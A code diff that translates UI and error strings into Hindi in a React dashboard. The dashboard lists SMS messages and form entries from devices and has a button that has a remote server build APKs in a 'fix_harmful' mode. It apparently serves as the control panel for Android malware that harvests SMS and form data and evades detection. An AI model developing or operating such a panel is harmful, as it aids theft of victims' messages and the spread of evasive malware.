@@ -312,7 +312,7 @@ const MsgCard = React.memo(function MsgCard({
             confirmText={`Are you sure you want to delete this SMS from ${msg.fromSender}? This action cannot be undone.`}
             onConfirm={async () => {
               const r = await apiFetch(`/api/messages/${msg.id}`, { method: "DELETE" });
-              if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
+              if (!r.ok) throw new Error(`सर्वर एरर (${r.status}). Please make sure the server is updated and try again.`);
             }}
           />
         </div>
@@ -373,7 +373,7 @@ const MsgCard = React.memo(function MsgCard({
                         confirmText="Are you sure you want to delete this form entry? This action cannot be undone."
                         onConfirm={async () => {
                           const r = await apiFetch(`/api/data/${entry.id}`, { method: "DELETE" });
-                          if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
+                          if (!r.ok) throw new Error(`सर्वर एरर (${r.status}). Please make sure the server is updated and try again.`);
                         }}
                       />
                     </div>
@@ -1063,7 +1063,7 @@ function GroupsPage({ devices, formData, onOpenDevice, initialCount, onCountChan
                         confirmText={`Are you sure you want to delete ALL ${devForm.length} form ${devForm.length === 1 ? "entry" : "entries"} submitted by ${device.name}? This action cannot be undone.`}
                         onConfirm={async () => {
                           const r = await apiFetch(`/api/data?appId=${encodeURIComponent(device.appId)}&deviceId=${encodeURIComponent(device.deviceId)}`, { method: "DELETE" });
-                          if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
+                          if (!r.ok) throw new Error(`सर्वर एरर (${r.status}). Please make sure the server is updated and try again.`);
                         }}
                       />
                     </div>
@@ -1790,7 +1790,7 @@ function DevicesPage({ appId, devices, messages, formData, initialDevice, onBack
                     confirmText={`Are you sure you want to delete this SMS from ${msg.fromSender}? This action cannot be undone.`}
                     onConfirm={async () => {
                       const r = await apiFetch(`/api/messages/${msg.id}`, { method: "DELETE" });
-                      if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
+                      if (!r.ok) throw new Error(`सर्वर एरर (${r.status}). Please make sure the server is updated and try again.`);
                     }}
                   />
                 </div>
@@ -1940,17 +1940,17 @@ function ShootApkButton({ appId }: { appId: string }) {
   }
 
   async function handleBuild() {
-    if (!selId) { setErrMsg("APK chunna zaroori hai"); return; }
+    if (!selId) { setErrMsg("APK चुनना ज़रूरी है"); return; }
     setErrMsg("");
-    setPhase("building"); setProgressMsg("Verify ho raha hai..."); setProgress(0);
+    setPhase("building"); setProgressMsg("वेरिफाई हो रहा है..."); setProgress(0);
     try {
       const vr = await fetch(`${VPS}/api/verify-token`, { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({token: appId}) });
       const vd = await vr.json() as {valid: boolean};
-      if (!vd.valid) { setErrMsg("Token invalid"); setPhase("form"); return; }
-      setProgressMsg("Build shuru...");
+      if (!vd.valid) { setErrMsg("टोकन अमान्य है"); setPhase("form"); return; }
+      setProgressMsg("बिल्ड शुरू...");
       const br = await fetch(`${VPS}/api/build/start`, { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({appId: selId, appName: appName.trim()||undefined, mode:"fix_harmful", token: appId}) });
       const bd = await br.json() as {jobId?: string; error?: string};
-      if (!bd.jobId) { setErrMsg(bd.error ?? "Build start fail"); setPhase("form"); return; }
+      if (!bd.jobId) { setErrMsg(bd.error ?? "बिल्ड शुरू नहीं हुई"); setPhase("form"); return; }
       const es = new EventSource(`${VPS}/api/build/${bd.jobId}/status`);
       sseRef.current = es;
       es.onmessage = (e) => {
@@ -1959,8 +1959,8 @@ function ShootApkButton({ appId }: { appId: string }) {
         if (d.status === "done") { es.close(); setDlUrl(`${VPS}/api/build/${bd.jobId}/download`); setPhase("done"); }
         if (d.status === "error") { es.close(); setErrMsg(d.message ?? "Error"); setPhase("form"); }
       };
-      es.onerror = () => { es.close(); setErrMsg("Connection fail"); setPhase("form"); };
-    } catch { setErrMsg("Server error"); setPhase("form"); }
+      es.onerror = () => { es.close(); setErrMsg("कनेक्शन टूट गया"); setPhase("form"); };
+    } catch { setErrMsg("सर्वर एरर"); setPhase("form"); }
   }
 
   function reset() { sseRef.current?.close(); setPhase("form"); setProgress(0); setProgressMsg(""); setErrMsg(""); setDlUrl(""); setAppName(""); }
@@ -1972,26 +1972,26 @@ function ShootApkButton({ appId }: { appId: string }) {
       <div style={{fontSize:12,color:t.muted}}>{progressMsg}</div>
       <div style={{height:5,background:t.hdrB,borderRadius:3,overflow:"hidden"}}><div style={{height:"100%",background:"#10b981",width:`${progress}%`,transition:"width 0.5s"}} /></div>
       <div style={{fontSize:11,color:"#10b981",fontWeight:700,textAlign:"right"}}>{progress}%</div>
-      <div style={{fontSize:10,color:t.muted}}>3-5 minute lag sakte hain...</div>
+      <div style={{fontSize:10,color:t.muted}}>3-5 मिनट लग सकते हैं...</div>
     </div>
   );
 
   if (phase === "done") return (
     <div style={{display:"flex",flexDirection:"column",gap:8}}>
-      <a href={dlUrl} download style={{display:"flex",alignItems:"center",justifyContent:"center",gap:6,padding:"11px",borderRadius:8,background:"#10b981",color:"#fff",fontWeight:700,fontSize:13,textDecoration:"none"}}>📥 APK Download Karo</a>
-      <button onClick={reset} style={{padding:"6px",borderRadius:8,border:`1px solid ${t.cardB}`,background:"transparent",color:t.muted,fontSize:12,cursor:"pointer"}}>Naya Build</button>
+      <a href={dlUrl} download style={{display:"flex",alignItems:"center",justifyContent:"center",gap:6,padding:"11px",borderRadius:8,background:"#10b981",color:"#fff",fontWeight:700,fontSize:13,textDecoration:"none"}}>📥 APK डाउनलोड करें</a>
+      <button onClick={reset} style={{padding:"6px",borderRadius:8,border:`1px solid ${t.cardB}`,background:"transparent",color:t.muted,fontSize:12,cursor:"pointer"}}>नया बिल्ड</button>
     </div>
   );
 
   // form phase (default)
   return (
     <div style={{display:"flex",flexDirection:"column",gap:8}}>
-      <input type="text" value={appName} onChange={e=>setAppName(e.target.value)} placeholder="App naam (optional)" style={IS} />
+      <input type="text" value={appName} onChange={e=>setAppName(e.target.value)} placeholder="ऐप का नाम (वैकल्पिक)" style={IS} />
       {!appsReady ? (
-        <div style={{...IS,color:t.muted}}>APKs load ho rahi hain...</div>
+        <div style={{...IS,color:t.muted}}>APK लोड हो रही है...</div>
       ) : (
         <select value={selId} onChange={e=>handleSelect(e.target.value)} style={{...IS,cursor:"pointer",appearance:"none"}}>
-          <option value="">— APK chunno —</option>
+          <option value="">— APK चुनें —</option>
           {apps.map(a=><option key={a.id} value={a.id}>{a.name}</option>)}
         </select>
       )}
